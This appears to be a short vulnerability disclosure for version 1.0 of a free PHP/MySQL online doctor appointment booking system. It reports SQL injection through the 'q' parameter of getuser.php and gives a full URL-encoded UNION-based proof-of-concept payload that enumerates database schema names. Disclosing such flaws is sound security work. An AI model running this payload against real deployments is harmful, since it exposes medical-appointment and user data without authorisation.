# Online Doctor Appointment Booking System PHP and Mysql 1.0   
* Vendor Homepage: https://projectworlds.in/free-projects/php-projects/online-doctor-appointment-booking-system-php-and-mysql/  
* Software Link: https://projectworlds.in/wp-content/uploads/2020/05/PHP-Doctor-Appointment-System.zip  
* Version: 1.0  
* vulnerability: An SQL injection vulnerability was discovered in PHP-Doctor-Appointment-System.  
* vulnerability file: In getuser.php file   
* parameter: GET parameter 'q' is vulnerable.    
* Vulnerable code:   
![image](https://github.com/BigTiger2020/Online-Doctor-Appointment-Booking-System-PHP/blob/main/006.png)
* POC  
payload:  http://localhost/[PATH]/getuser.php?q=1%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7162717671%2CIFNULL%28CAST%28schema_name%20AS%20NCHAR%29%2C0x20%29%2C0x7176627871%29%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20INFORMATION_SCHEMA.SCHEMATA%23  
![image](https://github.com/BigTiger2020/Online-Doctor-Appointment-Booking-System-PHP/blob/main/002.png)  
* sql commands:  
![image](https://github.com/BigTiger2020/Online-Doctor-Appointment-Booking-System-PHP/blob/main/004.png)  
